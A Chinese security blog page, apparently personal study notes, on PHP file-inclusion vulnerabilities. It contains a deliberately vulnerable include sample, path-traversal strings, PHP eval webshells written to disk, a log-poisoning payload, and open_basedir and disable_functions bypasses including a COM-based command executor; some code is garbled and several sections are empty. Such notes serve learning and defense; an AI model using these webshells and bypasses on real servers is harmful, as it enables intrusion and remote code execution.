@@ -1,0 +1,309 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="白尾青芳の小窝">
+  <title>File Include 任意文件包含 | 白尾青芳の小窝</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;600;700&family=Space+Grotesk:wght@500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/styles.css?v=20260722-2148">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+  <video class="backdrop" autoplay muted loop playsinline preload="auto" aria-hidden="true">
+    <source src="/images/wallpaper.mp4" type="video/mp4">
+  </video>
+
+  <button class="mobile-menu" id="menuToggle" type="button" aria-label="打开导航" aria-expanded="false">
+    <span></span><span></span><span></span>
+  </button>
+
+  <aside class="sidebar" id="sidebar">
+    <div class="profile">
+      <img class="avatar" src="/images/fox-avatar.jpg" alt="白尾青芳头像">
+      <p class="eyebrow">SECURITY · CODE · NOTES</p>
+      <h1>白尾青芳</h1>
+      <p class="motto">在每一次请求与响应之间，找到系统真实的边界。</p>
+    </div>
+
+    <nav class="main-nav" aria-label="主导航">
+      <a class="" href="/"><i data-lucide="home"></i><span>博客首页</span></a>
+      <a class="" href="/study/"><i data-lucide="book-open"></i><span>学习导航</span></a>
+      <a href="/categories/Web-%E5%AE%89%E5%85%A8/"><i data-lucide="shield-check"></i><span>Web 安全</span></a>
+      <a href="/categories/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"><i data-lucide="code-2"></i><span>开发笔记</span></a>
+      <a class="" href="/archives/"><i data-lucide="archive"></i><span>文章归档</span></a>
+      <a href="/about/"><i data-lucide="user-round"></i><span>关于我</span></a>
+    </nav>
+
+    <div class="sidebar-footer">
+      <div class="social-links">
+        <a target="_blank" rel="noopener" href="https://github.com/baiweiqingfang" aria-label="GitHub" title="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .5C5.65.5.5 5.65.5 12c0 5.1 3.29 9.43 7.86 10.96.58.1.79-.25.79-.56v-2.14c-3.2.7-3.87-1.36-3.87-1.36-.52-1.34-1.28-1.7-1.28-1.7-1.05-.72.08-.7.08-.7 1.16.08 1.77 1.2 1.77 1.2 1.03 1.76 2.7 1.25 3.36.96.1-.75.4-1.25.73-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.25.45-2.28 1.19-3.08-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.17 1.18.92-.26 1.9-.38 2.88-.39.98 0 1.96.13 2.88.39 2.2-1.49 3.16-1.18 3.16-1.18.63 1.58.23 2.75.11 3.04.74.8 1.19 1.83 1.19 3.08 0 4.42-2.69 5.39-5.25 5.67.41.36.78 1.06.78 2.14v3.17c0 .31.21.67.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5Z"/></svg></a>
+        <a href="/atom.xml" aria-label="RSS" title="RSS"><i data-lucide="rss"></i></a>
+      </div>
+      <p>© 2026 白尾青芳 · Powered by Hexo</p>
+    </div>
+  </aside>
+
+  <main class="content">
+    <article class="article-page">
+  <header class="article-header">
+    <p class="eyebrow">learning</p>
+    <h1>File Include 任意文件包含</h1>
+    <div class="post-meta">
+      <time datetime="2026-04-09T07:49:09.000Z">2026.04.09</time>
+      <span>11 分钟阅读</span>
+    </div>
+  </header>
+  <div class="article-content">
+    
+# File Include 任意文件包含
+
+服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP脚本来执行，这会节省大量时间
+
+## 1.文件包含函数
+
+PHP中提供了四个文件包含语函数
+
+| 函数             | 区别描述                                                     |
+| ---------------- | ------------------------------------------------------------ |
+| `include()`      | 多次包含，多次执行；<br>如果包含失败，脚本产生警告，继续运行。 |
+| `include_once()` | 只包含一次<br>如果包含失败，脚本产生警告，继续运行。         |
+| `require()`      | 多次包含，多次执行；<br>如果包含失败，脚本产生错误，结束执行。 |
+| `require_once()` | 只包含一次<br>如果包含失败，脚本产生错误，结束执行。         |
+
+## 2.相关配置
+
+文件包含是PHP 的基本功能之一,有本地文件包含与远程文件包含之分,本地文件包含可以读取和打开本地文件,远程文件包含可以远程(方式)加载文件。
+
+可以通过php.ini 中的选项进行配置。
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">On</span>/<span class="literal">Off</span>             <span class="comment"># 通过远程方式打开文件</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">On</span>/<span class="literal">Off</span>           <span class="comment"># 通过远程方式包含文件</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">open_basedir</span> = /var/www/html      <span class="comment">#限制 PHP 脚本只能访问指定目录下的文件，防止越目录访问。</span></span><br></pre></td></tr></table></figure>
+
+多个路径可用冒号 :（Linux）或分号 ;（Windows）分隔。
+
+## 3.动态包含
+
+### 3.1示例代码
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//file-include.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;filepath&#x27;</span>]</span><br><span class="line">@<span class="keyword">include</span> <span class="variable">$fp</span></span><br></pre></td></tr></table></figure>
+
+### 3.2本地文件包含
+
+本地文件包含(Local File Include,LFI)通过本地路径访问到的文件。
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filepath =.. /phpinfo.php</span><br></pre></td></tr></table></figure>
+
+### 3.3远程文件包含
+
+远程文件包含(Remote File Include,RFI),通过远程路径访问到的文件。
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filepath=http:<span class="comment">//10.9.64.180/phpinfo.jpg</span></span><br></pre></td></tr></table></figure>
+
+## 4.常见利用方式
+
+### 4.1包含session文件
+
+php session文件存放路径可以通过phpinfo页面中的session.save.path来获得，session文件名一般由sess_+sessionid组成
+
+session_id可以通过查看页面的cookie信息中的PHPSESSID获得
+
+若session_start()开启，则用户传输的数据会被保存在session文件中，就可以向session文件中写入shell
+
+### 4.2包含图片木马
+
+蚁剑直接连接
+
+### 4.3任意文件读取
+
+前提条件：
+
+目标文件存在（已知目标文件路径）
+
+具有文件可读权限
+
+具体方法：
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 相对路径</span></span><br><span class="line">?<span class="attr">filepath</span> =.. / .. / .. / .. / .. / .. /windows/system32/drivers/etc/hosts</span><br><span class="line"><span class="comment"># 绝对路径</span></span><br><span class="line">?<span class="attr">filepath</span>=c:/windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure>
+
+### 4.4包含图片码写Shell
+
+条件：
+
+确定文件包含漏洞存在
+
+蚁剑不能直接连接
+
+写shell：
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&#x27;w&#x27;</span> ),<span class="string">&#x27; &lt;?= @eval($_REQUEST[777]) ;phpinfo() ;? &gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span> php <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27; &lt;? php @eval($_REQUEST[777])?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+再用蚁剑连接
+
+### 4.6包含日志文件
+
+日志文件是Web服务器记录包含页面请求的历史记录，一般格式如下：
+
+![image-20260320223913541](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260320223913541.png)
+
+日志文件会记录访问请求，因此可以被写入shell
+
+<?php eval($POST[qmd]) ?>经过URL编码
+
+%3C%3Fphp%20eval%28%24POST%5Bqmd%5D%29%20%3F%3E可以传入存在文件包含漏洞的文件中，因为文件不存在所以会报错，但会被日志记录，因此包含日志文件就可以getshell
+
+Apache 日志:
+
+访问日志
+
+错误日志
+
+Nginx 日志:
+
+访问日志
+
+错误日志
+
+SSH 日志
+
+邮件日志
+
+### 4.7配合文件上传
+
+### 4.8PHP伪协议
+
+## 5.常见绕过方式
+
+### 5.1本地文件包含
+
+![image-20260320225959673](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260320225959673.png)
+
+路径长度截断：
+
+利用条件：php版本 < php 5.2.8
+
+Windows下目录最大长度为256字节，超出的部分会被丢弃
+
+Linux下目录最大长度为4096字节，超出的部分会被丢弃
+
+include $file.'/test/test.php';
+
+文件包含函数如果指定后缀，则可以不断增加输入的文件路经来获取所要包含的文件
+
+index.php?file =. /./.// .... .. / shell.txt
+
+后缀/test/test.php在达到最大值是会被丢弃
+
+### 5.2远程文件包含  
+
+文件包含函数如果指定后缀：
+
+include $file.'/test/test.php';
+
+可以通过问号来绕过：
+
+index.php?file=http://remoteaddr/remoteinfo.txt?
+
+则包含的文件为http://remoteaddr/remoteinfo.txt?/test/test.php
+
+问号后面的部分/test/test,php,也就是指定的后缀被当作query从而被绕过。
+
+### 5.3绕过open_basedir
+
+#### 5.3.1system等命令执行函数
+
+open_basedir无法限制操作系统层面的命令执行
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;system(&#x27;cat 文件完整路径&#x27;)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat 文件完整路径&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+#### 5.3.2symlink函数
+
+2. symlink函数
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;c&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&quot; .. &quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&quot; .. &quot;</span>);</span><br><span class="line">			<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">symlink</span>(<span class="string">&quot;c/d&quot;</span>,<span class="string">&quot;tmplink&quot;</span>));</span><br><span class="line">			<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">symlink</span>(<span class="string">&quot;使用tmplink进行目录穿越到要访问的文件&quot;</span>,<span class="string">&quot;exploit&quot;</span>));</span><br><span class="line">				<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;tmplink&quot;</span>);</span><br><span class="line">				<span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;tmplink&quot;</span>);</span><br><span class="line">					<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://127.0.0.1/exploit&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+原理
+
+创建/var/www/html/c/d/
+然后创建一个tmplink的符号链接指向这个位置
+从而使得/tmplink/ .. / .. /这个目录依然存在于
+web 目录的解析之下
+
+再创建符号链接exploit到这个目录下的某个文件
+然后删除符号链接,根目录下直接创建 tmplink
+的实际存在的目录
+
+最后访问exploit,会跳出原本限定的解析目录
+
+之后的两个例子访问/var/www/flag3.txt
+和/var/www/html1/flag3.txt
+
+#### 5.3.3glob伪协议
+
+glob在筛选目录时不受open_basedir的制约,
+可以利用它来绕过限制
+
+在允许的目录下新建php脚本：
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://*.php&quot;</span>);<span class="comment">//只读PHP文件</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="variable">$file_list</span>[] = (<span class="keyword">string</span>)<span class="variable">$f</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hidden files</span></span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://.git/*&quot;</span>);<span class="comment">//读取.git目录内容</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="variable">$file_list</span>[] = (<span class="keyword">string</span>)<span class="variable">$f</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">sort</span>(<span class="variable">$file_list</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$file_list</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;<span class="subst">$f</span>&lt;/b&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$f</span>) . <span class="string">&quot;&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+### 5.3绕过disable_functions
+
+#### 5.3.1换成功能上可以近似替代的函数
+
+#### 5.3.2windows com组件
+
+直接在已有的webshell中写入以下代码
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成一个COM对象</span></span><br><span class="line">Shell.Applicationtbne</span><br><span class="line"></span><br><span class="line"><span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;cmd</span></span><br><span class="line"><span class="string">/c&quot;</span>.<span class="variable">$command</span>);</span><br><span class="line"><span class="comment">//调用对象方法来执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line"><span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+URL中执行shell.php?cmd=系统命令
+
+#### 5.3.3pcntl_exec绕过
+
+如果目标机器安装并启用了php组件Pcntl,就可以使用pcntl_exec()这个pcntl插件专有的命令执行函数来执行系统命令
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pcntl_exec().php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/bin/bash&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;/tmp/b4dboy.sh&quot;</span>));<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#/tmp/b4dboy.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">ls -l /</span><br></pre></td></tr></table></figure>
+
+1.上传脚本：把b4dboy.sh上传到服务器的/tmp目录（通常这个目录有写权限）。
+
+2.触发执行：访问pcntl_exec().php
+
+3.进程替换：PHP 进程瞬间变成了 Bash 进程。
+
+4.命令落地：Bash运行/tmp/b4dboy.sh里的ls -l /，并返回结果
+
+#### 5.3.4LD PRELOAD绕过
+
+## 6.防御方式
+
+尽量少的使用文件包含
+
+严格过滤被包含文件的路径
+
+将参数allow_url_include设置为Off
+
+使用参数open_basedir限定文件访问范围
+
+data://必须在双on才能正常使用 
+
+
+
+
+
+  </div>
+</article>
+
+  </main>
+
+  <button class="back-to-top" id="backToTop" type="button" aria-label="回到顶部"><i data-lucide="arrow-up"></i></button>
+  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+  <script src="/js/main.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+
+
+
